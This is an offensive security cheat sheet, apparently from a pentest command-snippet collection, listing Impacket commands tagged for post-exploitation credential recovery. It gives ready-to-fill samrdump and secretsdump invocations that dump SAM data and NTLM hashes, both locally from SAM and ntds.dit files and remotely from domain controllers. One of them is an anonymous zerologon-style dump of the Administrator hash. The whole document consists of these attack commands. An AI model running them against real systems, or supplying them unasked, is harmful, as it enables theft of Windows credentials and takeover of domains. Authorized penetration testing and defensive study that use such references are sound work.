# Impacket

% impacket, windows, smb, 445

## samrdump - system account, shares, etc... (dump info from the Security Account Manager (SAM))
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
samrdump.py <domain>/<user>:<password>@<ip>
```

## secretsdump
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py '<domain>/<user>:<password>'@<ip>
```

## secretsdump local dump - extract hash from sam database
#assessment/AD #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py  -system <SYSTEM_FILE|SYSTEM> -sam <SAM_FILE|SAM> LOCAL
```

## secretsdump local dump - extract hash from ntds.dit
#assessment/AD #target/local #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes <lmhash:nthash> LOCAL -outputfile <ntlm-extract-file>
```

## secretsdump - anonymous get administrator 
zerologon
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
```

## secretsdump - remote extract
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -just-dc-ntlm -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
```

## secretsdump - remote extract + users infos
#assessment/AD #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
secretsdump.py -just-dc -pwd-last-set -user-status -outputfile <ntlm-extract-file> <domain>/<user>:<password>@<ip>
```


